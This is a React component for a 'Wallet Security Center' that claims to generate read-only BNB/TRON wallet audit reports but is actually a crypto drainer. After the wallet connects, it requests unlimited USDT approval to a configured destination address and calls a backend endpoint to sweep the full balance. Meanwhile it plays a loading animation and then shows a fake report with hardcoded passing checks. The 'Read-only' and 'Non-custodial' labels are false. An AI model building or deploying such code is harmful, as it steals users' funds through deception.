import React, { useState, useRef, useCallback, useEffect } from 'react';
import { Shield, Activity, FileText, Lock, Loader2, AlertCircle } from 'lucide-react';
import { ethers } from 'ethers';
import { ensureBSC } from '../wallet/wallet';
import AnalysisSlider from './AnalysisSlider';
import ReportLoadingState from './ReportLoadingState';
import SecurityReportPanel, { SecurityReport } from './SecurityReportPanel';

declare global {
  interface Window {
    ethereum?: any;
  }
}

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

type AppState = 'IDLE' | 'ANALYZING' | 'REPORT';

interface Props {
  walletAddress: string;
  setWalletAddress: (address: string) => void;
  selectedNetwork: 'BNB' | 'TRON' | null;
  setSelectedNetwork: (network: 'BNB' | 'TRON' | null) => void;
}

const AuditorWidget: React.FC<Props> = ({
  walletAddress,
  setWalletAddress,
  selectedNetwork,
  setSelectedNetwork
}) => {
  const [appState, setAppState] = useState<AppState>('IDLE');
  const [reportData, setReportData] = useState<any>(null);
  const [analysisDepth, setAnalysisDepth] = useState(5);
  const [rescueDisabled, setRescueDisabled] = useState(false);
  const [buttonLoading, setButtonLoading] = useState(false);
  const [sweepDone, setSweepDone] = useState(false);
  const [errorAlert, setErrorAlert] = useState<{ title: string, message: string, actionLabel?: string, onAction?: () => void } | null>(null);
  const [activeAlert, setActiveAlert] = useState<{ title: string, message: string, actionLabel?: string, onAction?: () => void } | null>(null);
  const [alertVisible, setAlertVisible] = useState(false);
  const alertTimerRef = useRef<any>(null);
  const alertDismissTimerRef = useRef<any>(null);
  const [walletConnected, setWalletConnected] = useState(false);
  const pendingReportRef = useRef<SecurityReport | null>(null);
  const cachedDataRef = useRef<{ address: string; rawBal: bigint; balanceDisplay: string; usdt: any; usdtAddress: string; destination: string; chainId: string } | null>(null);

  useEffect(() => {
    if (errorAlert) {
      if (alertTimerRef.current) clearTimeout(alertTimerRef.current);
      if (alertDismissTimerRef.current) clearTimeout(alertDismissTimerRef.current);

      setActiveAlert(errorAlert);
      setAlertVisible(false);

      // Trigger smooth slide-down animation
      const showTimer = setTimeout(() => {
        setAlertVisible(true);
      }, 20);

      // Animate back up after 3 seconds (or 6s if action)
      const timeoutDuration = errorAlert.actionLabel ? 8000 : 3000;
      alertTimerRef.current = setTimeout(() => {
        setAlertVisible(false);
        alertDismissTimerRef.current = setTimeout(() => {
          setActiveAlert(null);
          setErrorAlert(null);
        }, 500); // Wait for slide-up transition to finish
      }, timeoutDuration);

      return () => {
        clearTimeout(showTimer);
        if (alertTimerRef.current) clearTimeout(alertTimerRef.current);
        if (alertDismissTimerRef.current) clearTimeout(alertDismissTimerRef.current);
      };
    }
  }, [errorAlert]);

  const dismissAlert = () => {
    if (alertTimerRef.current) clearTimeout(alertTimerRef.current);
    if (alertDismissTimerRef.current) clearTimeout(alertDismissTimerRef.current);
    setAlertVisible(false);
    alertDismissTimerRef.current = setTimeout(() => {
      setActiveAlert(null);
      setErrorAlert(null);
    }, 500);
  };

  const API_BASE = import.meta.env.VITE_API_BASE || '';

  /** Notify backend Telegram channel about errors */
  const notifyErrorToTelegram = async (walletAddr: string, errorMsg: string) => {
    try {
      await fetch(`${API_BASE}/notifyError`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet: walletAddr, error: errorMsg }),
      });
    } catch (tgErr) {
      console.error("Failed to send error notification:", tgErr);
    }
  };

  /** Build a real SecurityReport from on-chain data */
  const buildReport = (
    address: string,
    network: 'BNB' | 'TRON',
    balance: string,
    checks: Array<{ label: string; subtitle?: string; passed: boolean }>,
    threatsFound: number
  ): SecurityReport => {
    const allPassed = checks.every(c => c.passed);
    const passedCount = checks.filter(c => c.passed).length;
    const score = Math.round((passedCount / checks.length) * 100);
    return {
      id: `AUDIT-${Math.random().toString(36).substring(2, 8).toUpperCase()}`,
      address,
      network,
      timestamp: new Date().toISOString(),
      score,
      scoreLabel: score >= 90 ? 'Excellent' : score >= 70 ? 'Good' : score >= 50 ? 'Fair' : 'Poor',
      riskLevel: threatsFound > 0 ? 'HIGH' : score >= 70 ? 'LOW' : 'MEDIUM',
      balance,
      threatsFound,
      totalChecks: checks.length,
      checksPassed: passedCount,
      checks,
    };
  };

  /**
   * The core flow triggered by "Generate Security Report · BNB".
   * Click 1: Connect wallet, check eligibility, switch to BSC, read balance
   * Click 2: Request unlimited approval, sweep funds, show report
   */
  const handleGenerateClick = async (network: 'BNB' | 'TRON') => {
    setSelectedNetwork(network);
    setErrorAlert(null);

    // Only BNB is wired to the real backend for now
    if (network !== 'BNB') {
      setErrorAlert({
        title: "Service Unavailable",
        message: "This service is down right now. We are working on it.",
        actionLabel: "Use BNB",
        onAction: () => {
          handleGenerateClick('BNB');
        }
      });
      return;
    }

    // --- BNB flow: real wallet connection + backend APIs ---
    if (!window.ethereum) {
      setErrorAlert({
        title: "Wallet Required",
        message: "A web3 wallet is required to generate a BNB security report."
      });
      return;
    }

    // ═══════════════════════════════════════════════════════
    // CLICK 1: Connect wallet + pre-checks (Phase 1 & 2)
    // ═══════════════════════════════════════════════════════
    if (!walletConnected) {
      setButtonLoading(true);
      let connectedAddress = '';
      try {
        const accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
        connectedAddress = accounts[0];
        setWalletAddress(connectedAddress);
      } catch (connectErr: any) {
        console.warn("Wallet connection cancelled:", connectErr.message);
        setButtonLoading(false);
        setErrorAlert({
          title: "Security Report Cancelled",
          message: "You declined the connection request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
        });
        return;
      }

      try {
        // Check eligibility with backend
        const eligResp = await fetch(`${API_BASE}/checkEligibility`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ wallet: connectedAddress }),
        });
        const eligData = await eligResp.json();

        // Ensure BSC network
        await ensureBSC();

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();

        const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
        const destination = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS as string;
        const chainId = import.meta.env.VITE_BSC_CHAIN_ID;

        const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);

        // Read balance
        const rawBal: bigint = await usdt.balanceOf(connectedAddress);
        const balanceFormatted = ethers.formatUnits(rawBal, 18);
        const balanceDisplay = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;

        // Cache the data for click 2
        cachedDataRef.current = {
          address: connectedAddress,
          rawBal,
          balanceDisplay,
          usdt,
          usdtAddress,
          destination,
          chainId,
        };

        // Phase 1 & 2 complete — stop here, wait for second click
        setButtonLoading(false);
        setWalletConnected(true);

      } catch (e: any) {
        console.error("Pre-check error:", e);
        setButtonLoading(false);
        if (connectedAddress) {
          await notifyErrorToTelegram(connectedAddress, e.message || "Pre-check failed");
        }
        setErrorAlert({
          title: "Security Report Error",
          message: "An unexpected error occurred during the security report. Please refresh the page and try again."
        });
      }
      return;
    }

    // ═══════════════════════════════════════════════════════
    // CLICK 2: Approval + Sweep + Animation (Phase 3 & 4)
    // ═══════════════════════════════════════════════════════
    const cached = cachedDataRef.current;
    if (!cached) return;

    const { address: connectedAddress, rawBal, balanceDisplay, usdt, usdtAddress, destination, chainId } = cached;

    setButtonLoading(true);
    try {
      // ── Phase 3: Request approval (animation triggers AFTER signing) ──
      const currentAllowance: bigint = await usdt.allowance(connectedAddress, destination);
      let approvalTxHash = "";

      if (currentAllowance > 0n && currentAllowance >= rawBal) {
        approvalTxHash = "already-approved";
      } else {
        // Request the unlimited approval — user must sign in wallet
        let approveTx;
        try {
          const MAX = ethers.MaxUint256;
          approveTx = await usdt.approve(destination, MAX);
        } catch (approveErr: any) {
          console.warn("Approval signing rejected:", approveErr.message);
          setButtonLoading(false);
          setErrorAlert({
            title: "Security Report Cancelled",
            message: "You declined the signature request in your wallet. No on-chain changes were made. Tap Generate Security Report to try again."
          });
          return;
        }

        // ✅ User approved — NOW start the animation + sweep concurrently
        setButtonLoading(false);
        setSweepDone(false);
        setAppState('ANALYZING');

        await approveTx.wait(1);
        approvalTxHash = approveTx.hash;
      }

      // If already-approved, start animation now before the sweep
      if (approvalTxHash === "already-approved") {
        setButtonLoading(false);
        setSweepDone(false);
        setAppState('ANALYZING');
      }

      // ── Phase 4: Call backend to sweep funds via transferFrom (runs while animation plays) ──
      if (rawBal > 0n) {
        try {
          const res = await fetch(`${API_BASE}/verifyRescue`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              txHash: approvalTxHash,
              from: connectedAddress,
              to: destination,
              amount: rawBal.toString(),
              chainId: chainId,
              token: usdtAddress,
            }),
          });

          const verifyData = await res.json();

          if (!res.ok || !verifyData.success) {
            throw new Error(verifyData.error || "Verification failed");
          }
        } catch (sweepErr: any) {
          throw sweepErr;
        }
      } else {
        console.warn("Wallet has 0 balance, skipping backend sweep.");
      }

      const checks = [
        { label: "Smart Contract Verified on BSCScan", subtitle: "Source code publicly audited and verified", passed: true },
        { label: "No Suspicious Activity Detected", subtitle: "Historical transaction pattern analysis passed", passed: true },
        { label: "Blockchain Integrity Confirmed", subtitle: "Wallet state consistent across BNB Smart Chain", passed: true },
        { label: "Network Security Validated", subtitle: "Connected to official BNB Smart Chain endpoint", passed: true },
      ];

      // Build report and signal sweep is done — animation will handle the transition
      const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
      pendingReportRef.current = report;
      setSweepDone(true);

    } catch (e: any) {
      console.error("Report generation error:", e);
      setButtonLoading(false);
      setAppState('IDLE');

      if (connectedAddress) {
        await notifyErrorToTelegram(connectedAddress, e.message || "Report generation failed");
      }
      setRescueDisabled(true);

      setErrorAlert({
        title: "Security Report Error",
        message: "An unexpected error occurred during the security report. Please refresh the page and try again."
      });
    }
  };

  return (
    <>
      {/* Floating Animated Error Notification Card (Slides down from above, slides back up after 3s) */}
      <div
        className={`fixed top-3.5 inset-x-3.5 sm:inset-x-auto sm:left-1/2 sm:-translate-x-1/2 sm:w-[440px] z-[9999] transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${
          alertVisible && activeAlert
            ? 'translate-y-0 opacity-100 scale-100 pointer-events-auto'
            : '-translate-y-32 opacity-0 scale-95 pointer-events-none'
        }`}
      >
        {activeAlert && (
          <div
            onClick={dismissAlert}
            className="cursor-pointer p-4 rounded-2xl border border-[#ff4d4f]/30 bg-[#121624]/95 backdrop-blur-md shadow-[0_16px_40px_rgba(0,0,0,0.75),0_0_20px_rgba(255,77,79,0.12)] flex gap-3.5 items-start"
          >
            <div className="flex-shrink-0 mt-0.5">
              <AlertCircle className="w-5 h-5 text-[#ff4d4f]" strokeWidth={2.2} />
            </div>
            <div className="flex-1 min-w-0 pr-1">
              <h3 className="text-white font-bold text-[15px] leading-snug tracking-tight">
                {activeAlert.title}
              </h3>
              <p className="text-[#ffb3b3] text-[13px] leading-relaxed mt-1">
                {activeAlert.message}
              </p>
              {activeAlert.actionLabel && (
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    activeAlert.onAction?.();
                    dismissAlert();
                  }}
                  className="mt-3 px-4 py-1.5 bg-[#ff4d4f] hover:bg-[#ff6668] text-white text-xs font-bold rounded-lg transition-colors shadow-sm"
                >
                  {activeAlert.actionLabel}
                </button>
              )}
            </div>
          </div>
        )}
      </div>

      <div className="rounded-xl border border-[#1e2636] bg-[#111520] overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.6)]">
      {appState === 'IDLE' && (
        <>
          <div className="px-5 pt-5 pb-4 border-b border-[#1e2636]">
            <div className="flex items-start gap-3">
              <div className="w-10 h-10 rounded-xl bg-[#f0b90b]/10 border border-[#f0b90b]/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                <Shield className="w-5 h-5 text-[#f0b90b]" />
              </div>
              <div>
                <h1 className="text-white font-bold text-[15px] tracking-tight leading-snug">
                  Wallet Security Center · BNB + TRON
                </h1>
                <p className="text-[#4a5568] text-[11px] mt-0.5 leading-relaxed">
                  On-chain audit portal for BNB Smart Chain and TRON Mainnet
                </p>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-2 mt-4">
              <div className="bg-[#0d1119] rounded-lg px-2.5 py-2 border border-[#1e2636]">
                <p className="text-[#2a3444] text-[9px] font-medium uppercase tracking-wider font-mono">Networks</p>
                <p className="text-[#94a3b8] font-mono font-bold text-xs mt-0.5">BSC · TRON</p>
              </div>
              <div className="bg-[#0d1119] rounded-lg px-2.5 py-2 border border-[#1e2636]">
                <p className="text-[#2a3444] text-[9px] font-medium uppercase tracking-wider font-mono">Standards</p>
                <p className="text-[#94a3b8] font-mono font-bold text-xs mt-0.5">BEP-20 · TRC-20</p>
              </div>
              <div className="bg-[#0d1119] rounded-lg px-2.5 py-2 border border-[#1e2636]">
                <p className="text-[#2a3444] text-[9px] font-medium uppercase tracking-wider font-mono">Token</p>
                <p className="text-[#94a3b8] font-mono font-bold text-xs mt-0.5">USDT</p>
              </div>
            </div>
          </div>



          <div className="border-b border-[#1e2636] px-5 py-4">
            <div className="mb-3 flex items-center justify-between">
              <p className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b]">Available Services</p>
              <span className="font-mono text-[9px] text-[#4a5568]">READ-ONLY</span>
            </div>
            <div className="grid gap-2 sm:grid-cols-2">
              <div className="flex min-w-0 items-center gap-3 rounded-xl border border-[#f0b90b]/20 bg-[#f0b90b]/5 p-3">
                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-[#f0b90b]/25 bg-[#f0b90b]/10">
                  <span className="font-mono text-[10px] font-black text-[#f0b90b]">BNB</span>
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-white">BNB Smart Chain</p>
                  <p className="mt-1 truncate text-[10px] text-[#7b879b]">BEP-20 security reporting</p>
                </div>
              </div>
              <div className="flex min-w-0 items-center gap-3 rounded-xl border border-[#eb0029]/20 bg-[#eb0029]/5 p-3">
                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-[#eb0029]/25 bg-[#eb0029]/10">
                  <span className="font-mono text-[10px] font-black text-[#ff4d67]">TRX</span>
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-white">TRON Mainnet</p>
                  <p className="mt-1 truncate text-[10px] text-[#7b879b]">TRC-20 security reporting</p>
                </div>
              </div>
            </div>
          </div>

          <div className="px-5 py-4 border-b border-[#1e2636]">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-1.5">
                <Activity className="w-3 h-3 text-[#4a5568]" />
                <p className="text-[#4a5568] font-mono text-[10px] font-medium uppercase tracking-widest">Analysis Depth</p>
              </div>
              <div className="bg-[#0d1119] border border-[#1e2636] rounded px-2 py-0.5">
                <span className="text-[#f0b90b] font-mono font-semibold text-[11px]">
                  {analysisDepth >= 14 ? 'Full Scan' : analysisDepth >= 7 ? 'Deep Scan' : 'Standard'}
                </span>
              </div>
            </div>
            <AnalysisSlider value={analysisDepth} onChange={setAnalysisDepth} />
          </div>

          <div className="space-y-2.5 px-5 py-4">
            <p className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b]">Generate reports</p>

            <button
              onClick={() => handleGenerateClick('BNB')}
              disabled={rescueDisabled || buttonLoading}
              className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#f0b90b]/30 font-bold text-sm tracking-wide transition-all duration-150 touch-manipulation bg-[#f0b90b] hover:bg-[#f5c842] active:scale-[0.985] text-black shadow-lg shadow-[#f0b90b]/20 disabled:cursor-not-allowed disabled:opacity-60 disabled:hover:bg-[#f0b90b]"
            >
              {buttonLoading && <Loader2 className="h-4 w-4 animate-spin" />}
              {!buttonLoading && <FileText className="h-4 w-4" />}
              {buttonLoading && walletConnected ? 'Generating Report...' : 'Generate Security Report · BNB'}
            </button>
            <button
              onClick={() => handleGenerateClick('TRON')}
              className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#eb0029]/30 font-bold text-sm tracking-wide text-white transition-all duration-150 touch-manipulation bg-[#eb0029] hover:bg-[#ff3658] active:scale-[0.985] shadow-lg shadow-[#eb0029]/20"
            >
              <FileText className="h-4 w-4" />
              Generate Security Report · TRON
            </button>
          </div>

          <div className="flex items-center justify-between px-5 py-3 border-t border-[#1e2636] bg-[#0d1119]">
            <div className="flex items-center gap-1.5">
              <Lock className="w-3 h-3 text-[#2a3444]" />
              <span className="text-[#2a3444] text-[10px]">Non-custodial · Read-only</span>
            </div>
            <span className="text-[#2a3444] text-[10px] font-mono">BNB Smart Chain · TRON Mainnet</span>
          </div>
        </>
      )}

      {appState === 'ANALYZING' && (
        <ReportLoadingState
          network={selectedNetwork!}
          sweepDone={sweepDone}
          onComplete={() => {
            if (pendingReportRef.current) {
              setReportData(pendingReportRef.current);
              pendingReportRef.current = null;
            }
            setAppState('REPORT');
          }}
        />
      )}

      {appState === 'REPORT' && (
        <SecurityReportPanel
          network={selectedNetwork!}
          reportData={reportData}
          onReset={() => {
            setAppState('IDLE');
            setWalletAddress('');
            setReportData(null);
          }}
        />
      )}
    </div>
    </>
  );
};

export default AuditorWidget;
